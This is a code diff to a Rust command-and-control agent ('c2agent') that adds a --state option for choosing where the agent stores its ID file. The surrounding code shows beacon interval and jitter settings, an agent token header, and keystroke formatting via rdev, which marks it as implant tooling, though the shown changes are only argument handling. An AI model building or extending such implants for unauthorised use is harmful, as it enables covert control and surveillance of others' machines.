@@ -220,7 +220,7 @@ fn format_key(key: rdev::Key) -> String {
 }
 
 impl Agent {
-    fn new(server: &str, token: &str, interval: u64, jitter: u64, verbose: bool) -> Self {
+    fn new(server: &str, token: &str, interval: u64, jitter: u64, verbose: bool, state_file: PathBuf) -> Self {
         let mut headers = reqwest::header::HeaderMap::new();
         headers.insert("X-Agent-Token", token.parse().unwrap());
         let client = reqwest::blocking::Client::builder()
@@ -228,7 +228,6 @@ impl Agent {
             .timeout(Duration::from_secs(120))
             .build()
             .expect("failed to build HTTP client");
-        let state_file = home_file(".c2agent_rs.json");
         let agent_id = load_id(&state_file);
         Agent {
             server: server.trim_end_matches('/').to_string(),
@@ -1584,6 +1583,7 @@ fn main() {
     let mut token = String::new();
     let mut interval: u64 = 10;
     let mut jitter: u64 = 0;
+    let mut state_file: Option<PathBuf> = None;
     let mut verbose = false;
 
     let mut args = env::args().skip(1);
@@ -1593,6 +1593,7 @@ fn main() {
             "--token" => token = args.next().unwrap_or_default(),
             "--interval" => interval = args.next().and_then(|v| v.parse().ok()).unwrap_or(10),
             "--jitter" => jitter = args.next().and_then(|v| v.parse().ok()).unwrap_or(0),
+            "--state" => state_file = Some(args.next().map(PathBuf::from).unwrap_or_default()),
             "--verbose" => verbose = true,
             _ => {}
         }
@@ -1604,10 +1605,11 @@ fn main() {
         token = env::var("C2_TOKEN").unwrap_or_default();
     }
     if server.is_empty() || token.is_empty() {
-        eprintln!("usage: c2agent --server URL --token TOKEN [--interval N] [--jitter N] [--verbose]");
+        eprintln!("usage: c2agent --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]");
         std::process::exit(1);
     }
 
-    let mut agent = Agent::new(&server, &token, interval, jitter, verbose);
+    let state_file = state_file.unwrap_or_else(|| home_file(".c2agent_rs.json"));
+    let mut agent = Agent::new(&server, &token, interval, jitter, verbose, state_file);
     agent.run();
 }
